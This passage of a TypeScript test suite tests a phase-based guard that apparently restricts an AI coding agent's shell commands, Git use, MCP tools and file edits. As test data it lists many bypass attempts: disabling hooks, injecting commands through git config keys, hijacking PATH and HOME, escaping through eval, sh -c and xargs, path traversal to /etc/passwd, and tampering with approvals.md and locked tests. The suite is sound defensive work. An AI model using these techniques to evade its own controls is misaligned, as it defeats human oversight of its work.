  expect(run('GIT_TERMINAL_PROMPT=0 git push origin sdd/ABC-1')).toEqual({ verdict: 'push' })
})

test('builtin is stripped like command', () => {
  expect(run('builtin eval "git push --force origin main"')).toEqual({ verdict: 'deny', reason: TARGET_TEXT })
  expect(run('builtin git push --force origin main')).toEqual({ verdict: 'deny', reason: TARGET_TEXT })
  expect(run('builtin eval "npm test"', 'Build')).toEqual({ verdict: 'pass' })
})

test('any -c or --config-env on a git command is denied', () => {
  for (const command of [
    "git -c core.pager='git push --force' log",
    'git -c user.name=x commit -m x',
    'git --config-env=core.pager=X log',
    'git -ccore.pager=x log',
  ]) {
    expect(run(command, 'Build')).toEqual({ verdict: 'deny', reason: TARGET_TEXT })
  }
  expect(run('git -c core.hooksPath=/dev/null status', 'Build')).toEqual({ verdict: 'deny', reason: GIT_CONFIG_TEXT })
  expect(run('git -c Core.HooksPath=/dev/null commit -m x', 'Build')).toEqual({ verdict: 'deny', reason: GIT_CONFIG_TEXT })
  expect(run('git -c Core.HooksPath=/dev/null commit -m x', 'Intent')).toEqual({ verdict: 'deny', reason: VERIFY_TEXT })
  expect(run('git commit -m x', 'Build')).toEqual({ verdict: 'pass' })
})

test('outside Intent, git config that sets the fsmonitor, the hooks path, a diff or a filter key is denied with its own reason', () => {
  for (const command of [
    'git config core.fsmonitor true',
    'git config core.hooksPath .hooks',
    'git config --local Core.HooksPath x',
    'git config diff.external ./x.sh',
    'git config diff.py.textconv ./x.sh',
    'git config filter.lfs.smudge ./x.sh',
    'git config set core.fsmonitor true',
    'git config --add filter.x.clean y',
    'git config --unset core.hooksPath',
    'git config --global diff.x.command y',
    'git config --file=.git/config core.fsmonitor ./x.sh',
    'git config -e',
    'git config --edit',
    'git -c core.fsmonitor=./x.sh status',
    'git -c core.hooksPath=/dev/null commit -m x',
    'git -c diff.external=./x.sh diff',
    'git -c diff.py.textconv=./x.sh log -p',
    'git -c filter.x.smudge=y checkout .',
    'git -ccore.fsmonitor=x status',
    'git --config-env=core.fsmonitor=X status',
    'npm test && git config core.fsmonitor ./x.sh',
  ]) {
    for (const phase of PHASES.filter(name => name !== 'Intent')) {
      expect(`${command} @ ${phase}: ${JSON.stringify(run(command, phase))}`).toBe(
        `${command} @ ${phase}: ${JSON.stringify({ verdict: 'deny', reason: GIT_CONFIG_TEXT })}`
      )
    }
  }
})

test('git config that reads those keys, or sets another key, is not the git config rule', () => {
  for (const command of [
    'git config --get core.hooksPath',
    'git config core.hooksPath',
    'git config get core.fsmonitor',
    'git config --get-regexp diff',
    'git config --list',
    'git config -l',
    'git config user.name x',
  ]) {
    expect(`${command}: ${JSON.stringify(run(command, 'Build'))}`).toBe(`${command}: ${JSON.stringify({ verdict: 'pass' })}`)
  }
  expect(run('git config core.hooksPath x', 'Intent')).toEqual({ verdict: 'deny', reason: INTENT_SHELL_TEXT })
  expect(run('git -c core.fsmonitor=x status', 'Intent')).toEqual({ verdict: 'deny', reason: TARGET_TEXT })
  expect(run('git config core.hooksPath x', 'Build', { active: false })).toEqual({ verdict: 'pass' })
})

test('reasonKeyOf names the key of every reason from its text, and nothing for another text', () => {
  for (const [key, value] of Object.entries(REASONS)) {
    const text = typeof value === 'function' ? value('Build') : value
    expect(`${key}: ${reasonKeyOf(text)}`).toBe(`${key}: ${key}`)
  }
  expect(reasonKeyOf(REASONS.tests('tests/test_ac1.py'))).toBe('tests')
  expect(reasonKeyOf(REASONS.pushPhase('Spec'))).toBe('pushPhase')
  expect(reasonKeyOf('goal-and-do: the guard failed, so the call is blocked. See the debug log.')).toBeUndefined()
  expect(reasonKeyOf('')).toBeUndefined()
})

test('an export or allexport of GIT_*, HOME, XDG_CONFIG_HOME or PATH denies the whole command', () => {
  for (const command of [
    'export GIT_PAGER=x; git log',
    'export HOME=/tmp/x && git push origin sdd/ABC-1',
    'set -a; GIT_PAGER=x; git log',
    'set -o allexport; HOME=/tmp/x; git log',
    'GIT_PAGER=x; export GIT_PAGER; git log',
    'export XDG_CONFIG_HOME=/tmp',
    'export PATH=/tmp/bin:$PATH',
    'export FOO=1 GIT_SSH_COMMAND=x',
    'declare -x GIT_PAGER=x; git log',
    'typeset -gx HOME=/tmp/x',
    'readonly -x PATH=/tmp/bin',
    'true && export GIT_DIR=/tmp/x',
  ]) {
    expect(run(command, 'Build')).toEqual({ verdict: 'deny', reason: TARGET_TEXT })
  }
  expect(run('export HOME=/tmp/x && git push origin sdd/ABC-1')).toEqual({ verdict: 'deny', reason: TARGET_TEXT })
  expect(run('export FOO=1; npm test', 'Build')).toEqual({ verdict: 'pass' })
  expect(run('declare FOO=1; npm test', 'Build')).toEqual({ verdict: 'pass' })
  expect(run('declare GIT_PAGER=x', 'Build')).toEqual({ verdict: 'pass' })
  expect(run('set -e; FOO=1; npm test', 'Build')).toEqual({ verdict: 'pass' })
  expect(run('export GIT_TERMINAL_PROMPT=0; npm test', 'Build')).toEqual({ verdict: 'pass' })
})

test('eval and shell -c carrying such an assignment are denied', () => {
  for (const command of [
    'GIT_PAGER=x eval "git log"',
    'HOME=/tmp/x bash -c "git log"',
    'PATH=/tmp/bin sh -c "npm test"',
    'env XDG_CONFIG_HOME=/tmp bash -c "git status"',
    'GIT_SSH_COMMAND=x eval "npm test"',
  ]) {
    expect(run(command, 'Build')).toEqual({ verdict: 'deny', reason: TARGET_TEXT })
  }
  expect(run('FOO=1 eval "npm test"', 'Build')).toEqual({ verdict: 'pass' })
  expect(run('FOO=1 bash -c "npm test"', 'Build')).toEqual({ verdict: 'pass' })
})

test('xargs with git or gh is denied, xargs with another command is not', () => {
  expect(run('echo merge 12 | xargs gh pr', 'Build')).toEqual({ verdict: 'deny', reason: PR_TEXT })
  expect(run('echo merge 12 | xargs gh pr')).toEqual({ verdict: 'deny', reason: PR_TEXT })
  expect(run('xargs git log', 'Build')).toEqual({ verdict: 'deny', reason: TARGET_TEXT })
  expect(run('xargs -n 1 env git status', 'Build')).toEqual({ verdict: 'deny', reason: TARGET_TEXT })
  expect(run('echo a | xargs rm', 'Build')).toEqual({ verdict: 'pass' })
})

test('HOME, XDG_CONFIG_HOME, PATH and the GIT_CONFIG variables on a git command are denied', () => {
  for (const command of ['HOME=/tmp/x git log', 'XDG_CONFIG_HOME=/tmp git status', 'PATH=/tmp/bin git status', 'env HOME=/tmp git log']) {
    expect(run(command, 'Build')).toEqual({ verdict: 'deny', reason: TARGET_TEXT })
  }
  for (const name of ['GIT_CONFIG_NOSYSTEM', 'GIT_CONFIG_GLOBAL', 'GIT_CONFIG_SYSTEM']) {
    expect(run(`${name}=1 git status`, 'Build')).toEqual({ verdict: 'deny', reason: VERIFY_TEXT })
  }
  expect(run('LC_ALL=C git push origin sdd/ABC-1')).toEqual({ verdict: 'deny', reason: TARGET_TEXT })
  expect(run('LC_ALL=C git push origin sdd/ABC-1', 'Build')).toEqual({ verdict: 'deny', reason: PHASE_TEXT('Build') })
  expect(run('GIT_TERMINAL_PROMPT=0 git push origin sdd/ABC-1')).toEqual({ verdict: 'push' })
  expect(run('LC_ALL=C git log', 'Build')).toEqual({ verdict: 'pass' })
  expect(run('HOME=/tmp/x npm test', 'Build')).toEqual({ verdict: 'pass' })
})

test('an assignment-only segment of a sensitive name is denied, another is not', () => {
  for (const command of ['PATH=/tmp/x; git log', 'HOME=/tmp/x; git status', 'GIT_PAGER=x; git log', 'XDG_CONFIG_HOME=/tmp\ngit log', 'FOO=1 && PATH=/tmp/x']) {
    expect(run(command, 'Build')).toEqual({ verdict: 'deny', reason: TARGET_TEXT })
  }
  expect(run('FOO=1; git log', 'Build')).toEqual({ verdict: 'pass' })
  expect(run('GIT_TERMINAL_PROMPT=0; git log', 'Build')).toEqual({ verdict: 'pass' })
})

test('local exports, and an exporter argument with an expansion is denied', () => {
  for (const command of ['local -x HOME=/x; git log', 'export $N=x; git log', 'declare -x "$N"; git log', 'export "`echo HOME`=x"', 'typeset -x ${N}=x']) {
    expect(run(command, 'Build')).toEqual({ verdict: 'deny', reason: TARGET_TEXT })
  }
  expect(run('local FOO=1', 'Build')).toEqual({ verdict: 'pass' })
  expect(run('declare $N=x', 'Build')).toEqual({ verdict: 'pass' })
})

test('xargs into a shell, eval or an interpreter is denied', () => {
  for (const command of [
    'echo "git push --force origin main" | xargs -I{} sh -c {}',
    'xargs bash -c x',
    'xargs zsh -c x',
    'xargs eval x',
    'xargs python3 -c x',
    'xargs python x',
    'xargs node x',
    'xargs perl x',
    'xargs ruby x',
    'xargs env bash -c x',
  ]) {
    expect(run(command, 'Build')).toEqual({ verdict: 'deny', reason: TARGET_TEXT })
  }
  expect(run('xargs rm x', 'Build')).toEqual({ verdict: 'pass' })
})

test('a git command may not reach into another repository', () => {
  for (const command of [
    'git -C ../other log',
    'git -C /tmp/x status',
    'git -C . -C ../other status',
    'git --git-dir=../o/.git log',
    'git --git-dir ../o/.git log',
    'git --work-tree=../o status',
    'GIT_DIR=../o/.git git status',
    'GIT_WORK_TREE=../o git status',
    'GIT_COMMON_DIR=../o git status',
    'env GIT_DIR=../o/.git git log',
  ]) {
    expect(run(command, 'Build')).toEqual({ verdict: 'deny', reason: TARGET_TEXT })
  }
  expect(run('git -C . status', 'Build')).toEqual({ verdict: 'pass' })
  expect(run('git -C . log --oneline', 'Build')).toEqual({ verdict: 'pass' })
  expect(run('GIT_DIR=../o/.git git push origin sdd/ABC-1', 'Test')).toEqual({ verdict: 'deny', reason: PHASE_TEXT('Test') })
})

const EDIT_TOOLS = ['Write', 'Edit', 'MultiEdit', 'NotebookEdit']
// The mod resolves where an edit lands; here no part of a path is a symbolic link, unless a test says otherwise.
const edit = (tool: string, path: string, phase: PhaseName, overrides: Partial<Ctx> = {}) => {
  const root = overrides.root ?? '/repo'
  const real = { path: path.startsWith('/') ? path : `${root}/${path}`, root }
  return guard({ tool, input: { [tool === 'NotebookEdit' ? 'notebook_path' : 'file_path']: path } }, ctxFor(phase, { real, ...overrides }))
}

test('the Intent phase allows edits only in the change folder, resolved against the project root', () => {
  for (const tool of EDIT_TOOLS) {
    for (const path of ['/repo/changes/ABC-1/intent.md', '/repo/changes/ABC-1/notes/a.md', '/repo/./changes/ABC-1/x.md']) {
      expect(edit(tool, path, 'Intent'), `${tool} ${path}`).toEqual({ verdict: 'pass' })
    }
    for (const path of [
      'src/a.ts',
      '/repo/src/a.ts',
      '/tmp/changes/ABC-1/x',
      'changes/ABC-1/../src/a.ts',
      '/repo/changes/ABC-1/../../etc/passwd',
      '../changes/ABC-1/x',
      '/repo/changes/ABC-2/intent.md',
      'changes/ABC-1',
      '/repo/changes/ABC-1x/intent.md',
      '/repo-other/changes/ABC-1/intent.md',
      'changes/ABC-1/intent.md',
      './changes/ABC-1/notes/a.md',
    ]) {
      expect(edit(tool, path, 'Intent'), `${tool} ${path}`).toEqual({ verdict: 'deny', reason: INTENT_EDIT_TEXT })
    }
  }
  expect(edit('Write', '/repo/src/a.ts', 'Spec')).toEqual({ verdict: 'pass' })
  expect(edit('Write', '/repo/changes/ABC-1/intent.md', 'Intent', { root: '' })).toEqual({ verdict: 'deny', reason: INTENT_EDIT_TEXT })
  expect(edit('Write', 'changes/ABC-1/intent.md', 'Intent', { root: '' })).toEqual({ verdict: 'deny', reason: INTENT_EDIT_TEXT })
  expect(edit('Write', '/repo/changes/ABC-1/intent.md', 'Intent', { root: '/repo/' })).toEqual({ verdict: 'pass' })
})

test('the Intent phase allows only Jira reads among the MCP tools', () => {
  for (const tool of ['mcp__jira__getIssue', 'mcp__jira__searchIssues', 'mcp__jira__readIssue', 'mcp__corp-jira__getComments', 'mcp__JIRA__GetIssue']) {
    expect(guard({ tool, input: {} }, ctxFor('Intent')), tool).toEqual({ verdict: 'pass' })
  }
  for (const tool of [
    'mcp__jira__createIssue',
    'mcp__jira__updateIssue',
    'mcp__jira__addComment',
    'mcp__jira__transitionIssue',
    'mcp__jira__issueGet',
    'mcp__confluence__getPage',
    'mcp__dynatrace__getProblems',
    'mcp__playwright__browser_navigate',
    'mcp__getter__getIssue',
  ]) {
    expect(guard({ tool, input: {} }, ctxFor('Intent')), tool).toEqual({ verdict: 'deny', reason: INTENT_MCP_TEXT })
  }
  expect(guard({ tool: 'mcp__ghe__getIssue', input: {} }, ctxFor('Intent')).verdict).toBe('deny')
  expect(guard({ tool: 'mcp__confluence__getPage', input: {} }, ctxFor('Spec'))).toEqual({ verdict: 'pass' })
})

test('every phase denies edits to approvals.md', () => {
  for (const phase of PHASES) {
    for (const tool of EDIT_TOOLS) {
      for (const path of ['/repo/changes/ABC-1/approvals.md', 'changes/ABC-1/approvals.md', 'changes/ABC-1/./approvals.md']) {
        expect(edit(tool, path, phase), `${phase} ${tool} ${path}`).toEqual({ verdict: 'deny', reason: APPROVALS_TEXT })
      }
    }
  }
  expect(edit('Write', '/repo/changes/ABC-1/approvals.md.bak', 'Spec')).toEqual({ verdict: 'pass' })
  expect(edit('Write', '/repo/docs/approvals.md', 'Spec')).toEqual({ verdict: 'pass' })
})

// Jira reads

const mcp = (tool: string, phase: PhaseName = 'Intent') => guard({ tool, input: {} }, ctxFor(phase))

test('the Intent phase allows Jira reads in each of the three registrations ABC uses, in any case of the server name', () => {
  const rows: [string[], string[]][] = [
    [
      ['jira', 'Jira'],
      ['getIssue', 'searchIssues', 'getComments'],
    ],
    [
      ['jira', 'Jira'],
      ['jira_get_issue', 'jira_search'],
    ],
    [
      ['atlassian', 'Atlassian'],
      ['jira_get_issue', 'jira_search'],
    ],
  ]
  for (const [servers, names] of rows) {
    for (const server of servers) {
      for (const name of names) expect(mcp(`mcp__${server}__${name}`), `${server} ${name}`).toEqual({ verdict: 'pass' })
    }
  }
  expect(mcp('mcp__claude_ai_Atlassian__getJiraIssue')).toEqual({ verdict: 'pass' })
  expect(mcp('mcp__claude_ai_Atlassian__searchJiraIssuesUsingJql')).toEqual({ verdict: 'pass' })
})

test('the Intent phase denies Confluence tools on an Atlassian server, Jira writes, and reads of other servers', () => {
  for (const tool of [
    'mcp__atlassian__confluence_search',
    'mcp__atlassian__confluence_get_page',
    'mcp__atlassian__getConfluencePage',
    'mcp__Atlassian__getConfluencePage',
    'mcp__jira__jira_search_confluence',
    'mcp__claude_ai_Atlassian__getConfluencePage',
    'mcp__atlassian__jira_create_issue',
    'mcp__jira__jira_create_issue',
    'mcp__jira__jira_add_comment',
    'mcp__jira__jira_transition_issue',
    'mcp__atlassian__jira_update_issue',
    'mcp__jira__addComment',
    'mcp__jira__updateIssue',
    'mcp__jira__createIssue',
    'mcp__jira__jira_get',
    'mcp__dynatrace__getIssue',
  ]) {
    expect(mcp(tool), tool).toEqual({ verdict: 'deny', reason: INTENT_MCP_TEXT })
  }
  expect(mcp('mcp__github__getIssue')).toEqual({ verdict: 'deny', reason: GITHUB_TEXT })
  expect(mcp('mcp__atlassian__confluence_search', 'Spec')).toEqual({ verdict: 'pass' })
  // A Jira write passes in a later phase only when the approved plan names the tool (AC-10).
  expect(mcp('mcp__jira__jira_create_issue', 'Build').verdict).toBe('deny')
  const planned = ctxFor('Build', { plannedTools: ['mcp__jira__jira_create_issue'] })
  expect(guard({ tool: 'mcp__jira__jira_create_issue', input: {} }, planned)).toEqual({ verdict: 'pass' })
})

test('a Jira tool that only starts like a read is denied in Intent; the read nouns Transitions and Links stay reads', () => {
  for (const tool of [
    'mcp__jira__getOrCreateIssue',
    'mcp__jira__searchAndUpdate',
    'mcp__atlassian__jira_get_or_create',
    'mcp__jira__readAndDelete',
    'mcp__jira__getAndAssignIssue',
    'mcp__jira__getIssueAndTransition',
    'mcp__jira__getAndLinkIssue',
    'mcp__jira__getOrSetField',
    'mcp__jira__jira_get_and_upload',
    'mcp__jira__readThenWrite',
    'mcp__jira__getAndRemoveLabel',
    'mcp__jira__getAndEditIssue',
    'mcp__jira__searchAndPost',
    'mcp__jira__getAndPutIssue',
    'mcp__jira__get_or_addcomment',
    'mcp__jira__getorcreate',
    'mcp__jira__transitionIssue',
  ]) {
    expect(mcp(tool), tool).toEqual({ verdict: 'deny', reason: INTENT_MCP_TEXT })
  }
  for (const tool of [
    'mcp__jira__getIssue',
    'mcp__atlassian__jira_get_issue',
    'mcp__atlassian__jira_search',
    'mcp__jira__getIssueTransitions',
    'mcp__jira__getIssueLinks',
    'mcp__jira__jira_get_transitions',
    'mcp__jira__getCurrentUser',
    'mcp__jira__getProjects',
  ]) {
    expect(mcp(tool), tool).toEqual({ verdict: 'pass' })
  }
})

test('isJiraRead is the one rule for a Jira read, by the full tool name', () => {
  expect(isJiraRead('mcp__atlassian__jira_get_issue')).toBe(true)
  expect(isJiraRead('mcp__atlassian__confluence_search')).toBe(false)
  expect(isJiraRead('mcp__jira__getOrCreateIssue')).toBe(false)
  expect(isJiraRead('jira_get_issue')).toBe(false)
  expect(isJiraRead('Read')).toBe(false)
})

// The Intent phase's shell

test('the Intent phase denies every shell command but its Git commands for the change folder', () => {
  for (const command of [
    'echo x > src/a.ts',
    'sed -i s/a/b/ src/a.ts',
    'cp a b',
    'tee src/a.ts',
    "python -c 'print(1)'",
    'ls',
    'cat src/a.ts',
    'git add src/a.ts',
    'git add changes/ABC-1/../src/a.ts',
    'git add -A',
    'git add .',
    'git add --all changes/ABC-1/intent.md',
    'git add changes/ABC-1/*',
    'git add changes/ABC-1/{a,../../src/b}',
    'git add',
    'git commit -am x',
    'git commit -a -m x',
    'git commit --all -m x',
    'git commit -m x src/a.ts',
    'git commit -m x -- src/a.ts',
    'git commit -F /tmp/msg',
    'git commit -F -',
    'git commit --file=src/msg',
    'git commit',
    'git commit --amend --no-edit',
    'git commit -m x --include src/a.ts',
    'git status > out.txt',
    'git status >> out.txt',
    'git status 2>&1',
    'git log < in.txt',
    'git status | cat',
    'git status; rm -rf src',
    'git status && ls',
    'git status || ls',
    'git commit -m "$(cat src/a.ts)"',
    'git log `ls`',
    'git log $REV',
    'git add "changes/ABC-1/intent.md',
    'git config user.name x',
    'git restore src/a.ts',
    'git checkout -- src/a.ts',
    'git checkout src/a.ts',
    'git checkout main',
    'git checkout -b other origin/main',
    'git switch -c other origin/main',
    'git switch --discard-changes main',
    'git switch -c sdd/ABC-1 --track origin/main',
    'git branch feature',
    'git branch -D main',
    'git branch -m x',
    'git diff --output=src/a.ts',
    'git log --output src/a.ts',
    'git diff --ext-diff',
    'git fetch --upload-pack=x origin',
    'git rm src/a.ts',
    'git stash',
    'git reset --hard',
    'git --exec-path=/tmp status',
    'git -p status',
    'FOO=1 git status',
    'timeout 5 git status',
    'bash -c "git status"',
    'eval "git status"',
    'npm test',
    'mkdir -p changes/ABC-1',
  ]) {
    expect(run(command, 'Intent'), command).toEqual({ verdict: 'deny', reason: INTENT_SHELL_TEXT })
  }
  expect(run('git -c x=y status', 'Intent')).toEqual({ verdict: 'deny', reason: TARGET_TEXT })
  expect(run('git -C ../other status', 'Intent')).toEqual({ verdict: 'deny', reason: TARGET_TEXT })
  expect(run('git push origin sdd/ABC-1', 'Intent')).toEqual({ verdict: 'deny', reason: PHASE_TEXT('Intent') })
  expect(run('git commit --no-verify -m x', 'Intent')).toEqual({ verdict: 'deny', reason: VERIFY_TEXT })
})

test('the Intent phase allows Git commands for the branch and the change folder', () => {
  for (const command of [
    'git status',
    'git status --porcelain',
    'git log --oneline -5',
    'git --no-pager log -1',
    'git diff',
    'git diff --cached --stat',
    'git show HEAD',
    'git rev-parse --show-toplevel',
    'git branch',
    'git branch --show-current',
    'git branch -a',
    'git branch --list sdd/ABC-1',
    'git fetch origin',
    'GIT_TERMINAL_PROMPT=0 git fetch origin',
    'git switch -c sdd/ABC-1 origin/main',
    'git switch sdd/ABC-1',
    'git switch main',
    'git checkout sdd/ABC-1',
    'git checkout -b sdd/ABC-1 origin/main',
    'git add changes/ABC-1/request.md changes/ABC-1/intent.md',
    'git add -- changes/ABC-1/intent.md',
    'git add changes/ABC-1',
    'git add /repo/changes/ABC-1/intent.md',
    "git commit -m 'docs(ABC-1): intent'",
    'git commit -m "docs(ABC-1): a > b"',
    'git commit -mx',
    'git commit --message=x',
    'git commit -m x changes/ABC-1/intent.md',
    'git commit -m x -- changes/ABC-1/intent.md changes/ABC-1/request.md',
    'git commit -F changes/ABC-1/message.txt',
    'git commit --file .git/COMMIT_EDITMSG',
    'git commit --file=.git/COMMIT_EDITMSG',
    'git fetch origin && git switch sdd/ABC-1',
    'git add changes/ABC-1/intent.md && git commit -m x',
    'git status | git status',
  ]) {
    expect(run(command, 'Intent'), command).toEqual({ verdict: 'pass' })
  }
})

test('the Intent shell rule leaves the other phases as they are', () => {
  for (const phase of PHASES.filter(name => name !== 'Intent')) {
    for (const command of ['ls', 'cat src/a.ts', 'npm test', 'echo x > src/a.ts', 'git add -A', 'git commit -am x']) {
      expect(run(command, phase), `${command} @ ${phase}`).toEqual({ verdict: 'pass' })
    }
  }
})

// approvals.md and run.json by shell

test('every phase denies a shell command that names approvals.md or run.json, unless Git records or shows it', () => {
  const approvals = [
    'echo x >> changes/ABC-1/approvals.md',
    'echo x > changes/ABC-1/approvals.md',
    'echo x >changes/ABC-1/approvals.md',
    'echo x > /repo/changes/ABC-1/approvals.md',
    'tee -a changes/ABC-1/Approvals.MD',
    'cp x changes/ABC-1/approvals.md',
    'rm changes/ABC-1/approvals.md',
    'rm changes/ABC-1/appr*.md',
    'rm changes/*/approvals.md',
    'rm changes/ABC-1/approval?.md',
    'rm changes/ABC-1/{approvals,x}.md',
    'rm changes/{ABC-1/approvals.md,x}',
    'git show HEAD:changes/ABC-1/approvals.md > changes/ABC-1/approvals.md',
    'git checkout changes/ABC-1/approvals.md',
    'git restore changes/ABC-1/approvals.md',
    'git log --output=changes/ABC-1/approvals.md',
  ]
  const runFile = [
    'sed -i s/a/b/ changes/ABC-1/run.json',
    'echo {} > changes/ABC-1/run.json',
    'cp x changes/*/run.json',
    'rm changes/ABC-1/*.json',
    'git diff --output=changes/ABC-1/run.json',
  ]
  for (const phase of PHASES) {
    for (const command of approvals) {
      expect(run(command, phase), `${command} @ ${phase}`).toEqual({ verdict: 'deny', reason: APPROVALS_TEXT })
    }
    for (const command of runFile) {
      expect(run(command, phase), `${command} @ ${phase}`).toEqual({ verdict: 'deny', reason: RUN_FILE_TEXT })
    }
    for (const command of [
      'git add changes/ABC-1/approvals.md',
      'git commit -m x changes/ABC-1/approvals.md',
      'git diff changes/ABC-1/approvals.md',
      'git log -- changes/ABC-1/approvals.md',
      'git status changes/ABC-1/run.json',
    ]) {
      expect(run(command, phase), `${command} @ ${phase}`).toEqual({ verdict: 'pass' })
    }
  }
  expect(run('git show HEAD:changes/ABC-1/approvals.md', 'Build')).toEqual({ verdict: 'pass' })
  expect(run('npm run build > dist/run.json', 'Build')).toEqual({ verdict: 'pass' })
  expect(run('cat docs/approvals.md', 'Build')).toEqual({ verdict: 'pass' })
  expect(run('cat changes/ABC-1/spec.md', 'Build')).toEqual({ verdict: 'pass' })
})

test('a shell command that only reads approvals.md or run.json passes in every phase but Intent', () => {
  const reads = [
    'cat changes/ABC-1/approvals.md',
    'cat /repo/changes/ABC-1/approvals.md',
    'head -5 changes/ABC-1/approvals.md',
    'tail -n 3 changes/ABC-1/run.json',
    'grep locked-at changes/ABC-1/approvals.md',
    'grep -n "locked-at" changes/ABC-1/approvals.md',
    'wc -l changes/ABC-1/approvals.md',
    'cat < changes/ABC-1/approvals.md',
    'cat changes/ABC-1/approvals.md 2>&1',
    'cat changes/ABC-1/approvals.md 2>/dev/null',
    'git status && cat changes/ABC-1/approvals.md',
    'cat changes/ABC-1/approvals.md | grep locked-at',
    'cat changes/ABC-1/approvals.md | head -3 | wc -l',
    'grep locked-at changes/ABC-1/approvals.md | tail -1',
    'LC_ALL=C grep x changes/ABC-1/approvals.md',
    'cat changes/*/approvals.md',
  ]
  for (const phase of PHASES.filter(name => name !== 'Intent')) {
    for (const command of reads) {
      expect(run(command, phase), `${command} @ ${phase}`).toEqual({ verdict: 'pass' })
    }
  }
  expect(run('cat changes/ABC-1/approvals.md', 'Intent')).toEqual({ verdict: 'deny', reason: INTENT_SHELL_TEXT })
})

test('a shell command that could write approvals.md or run.json stays denied, with the reason of the file', () => {
  const approvals = [
    'cat x > changes/ABC-1/approvals.md',
    'cat changes/ABC-1/approvals.md > x',
    'cat changes/ABC-1/approvals.md >x',
    'cat changes/ABC-1/approvals.md >> x',
    'cat changes/ABC-1/approvals.md >| x',
    'cat changes/ABC-1/approvals.md &> x',
    'cat changes/ABC-1/approvals.md 2> x',
    'cat changes/ABC-1/approvals.md 1>x',
    '>x cat changes/ABC-1/approvals.md',
    '>changes/ABC-1/approvals.md true',
    'sed -n 1,5p changes/ABC-1/approvals.md',
    "sed -n '/locked/,/end/p' changes/ABC-1/approvals.md",
    "awk '{print $1}' changes/ABC-1/approvals.md",
    'sed -i s/a/b/ changes/ABC-1/approvals.md',
    'sed -i.bak s/a/b/ changes/ABC-1/approvals.md',
    'sed -ni 1p changes/ABC-1/approvals.md',
    'sed --in-place s/a/b/ changes/ABC-1/approvals.md',
    'sed -n 1p -i changes/ABC-1/approvals.md',
    'sed s/a/b/ changes/ABC-1/approvals.md',
    "sed -n 'w x' changes/ABC-1/approvals.md",
    "sed -n '1,5w changes/ABC-1/approvals.md' changes/ABC-1/approvals.md",
    "sed -n 's/a/b/w x' changes/ABC-1/approvals.md",
    "sed -n '1e touch x' changes/ABC-1/approvals.md",
    'sed -n -f s.sed changes/ABC-1/approvals.md',
    'tee changes/ABC-1/approvals.md',
    'tee -a changes/ABC-1/approvals.md',
    'cat x | tee changes/ABC-1/approvals.md',
    'echo x >> changes/ABC-1/approvals.md',
    'cp x changes/ABC-1/approvals.md',
    'mv x changes/ABC-1/approvals.md',
    'rm changes/ABC-1/approvals.md',
    'touch changes/ABC-1/approvals.md',
    'awk \'{print > "f"}\' changes/ABC-1/approvals.md',
    'awk \'{print >> "f"}\' changes/ABC-1/approvals.md',
    'awk \'{print | "sh"}\' changes/ABC-1/approvals.md',
    'awk \'{system("rm x")}\' changes/ABC-1/approvals.md',
    "awk -i inplace '{print}' changes/ABC-1/approvals.md",
    'awk -f p.awk changes/ABC-1/approvals.md',
    'less -o x changes/ABC-1/approvals.md',
    'xargs cat < changes/ABC-1/approvals.md',
    'echo changes/ABC-1/approvals.md | xargs cat',
    'cat changes/ABC-1/approvals.md; cp x changes/ABC-1/approvals.md',
    'cat changes/ABC-1/approvals.md && echo x > changes/ABC-1/approvals.md',
    'bash -c "echo x > changes/ABC-1/approvals.md"',
  ]
  const runFile = [
    'cat x > changes/ABC-1/run.json',
    'less changes/ABC-1/run.json',
    'sed -n -e 1,5p changes/ABC-1/run.json',
    "awk -F: '{print $2}' changes/ABC-1/run.json",
    'cat changes/ABC-1/run.json > x',
    'sed -i s/a/b/ changes/ABC-1/run.json',
    'tee changes/ABC-1/run.json',
    'echo {} >> changes/ABC-1/run.json',
    'cp x changes/ABC-1/run.json',
    'awk \'{print > "f"}\' changes/ABC-1/run.json',
    'cat x | tee changes/ABC-1/run.json',
  ]
  for (const phase of ['Plan', 'Build', 'Test'] as const) {
    for (const command of approvals) {
      expect(run(command, phase), `${command} @ ${phase}`).toEqual({ verdict: 'deny', reason: APPROVALS_TEXT })
    }
    for (const command of runFile) {
      expect(run(command, phase), `${command} @ ${phase}`).toEqual({ verdict: 'deny', reason: RUN_FILE_TEXT })
    }
  }
})

// Symbolic links and unanchored paths

test('the Intent phase judges an edit by where it lands, every symbolic link followed', () => {
  for (const tool of EDIT_TOOLS) {
    const through = { real: { path: '/repo/src/a.ts', root: '/repo' } }
    expect(edit(tool, '/repo/changes/ABC-1/s/a.ts', 'Intent', through), tool).toEqual({ verdict: 'deny', reason: INTENT_EDIT_TEXT })
    const unplaced = { real: { path: '', root: '/repo' } }
    expect(edit(tool, '/repo/changes/ABC-1/intent.md', 'Intent', unplaced), tool).toEqual({ verdict: 'deny', reason: UNPLACED_TEXT })
    const linkedRoot = { real: { path: '/private/repo/changes/ABC-1/intent.md', root: '/private/repo' } }
    expect(edit(tool, '/repo/changes/ABC-1/intent.md', 'Intent', linkedRoot), tool).toEqual({ verdict: 'pass' })
    const linkedFolder = { real: { path: '/elsewhere/intent.md', root: '/repo' } }
    expect(edit(tool, '/repo/changes/ABC-1/intent.md', 'Intent', linkedFolder), tool).toEqual({ verdict: 'deny', reason: INTENT_EDIT_TEXT })
  }
  const bare = guard({ tool: 'Write', input: { file_path: '/repo/changes/ABC-1/intent.md' } }, ctxFor('Intent'))
  expect(bare).toEqual({ verdict: 'deny', reason: INTENT_EDIT_TEXT })
})

test('every phase judges approvals.md, run.json and the locked tests by where an edit lands', () => {
  for (const phase of PHASES) {
    const approvals = { real: { path: '/repo/changes/ABC-1/approvals.md', root: '/repo' } }
    expect(edit('Write', '/repo/changes/ABC-1/a.md', phase, approvals), phase).toEqual({ verdict: 'deny', reason: APPROVALS_TEXT })
    const runJson = { real: { path: '/repo/changes/ABC-1/run.json', root: '/repo' } }
    expect(edit('Write', '/repo/changes/ABC-1/r.json', phase, runJson), phase).toEqual({ verdict: 'deny', reason: STATE_TEXT })
  }
  const locked = { real: { path: '/repo/tests/test_ac1.py', root: '/repo' } }
  expect(edit('Edit', '/repo/docs/t.py', 'Build', locked)).toEqual({ verdict: 'deny', reason: testsText('tests/test_ac1.py') })
  expect(edit('Write', '/repo/docs/a.md', 'Build', { real: { path: '', root: '/repo' } })).toEqual({ verdict: 'deny', reason: UNPLACED_TEXT })
  expect(guard({ tool: 'Write', input: { file_path: '/repo/src/a.ts' } }, ctxFor('Build'))).toEqual({ verdict: 'pass' })
})

test('the Intent phase denies an edit it cannot anchor: a relative path, or an unknown project root', () => {
  for (const tool of EDIT_TOOLS) {
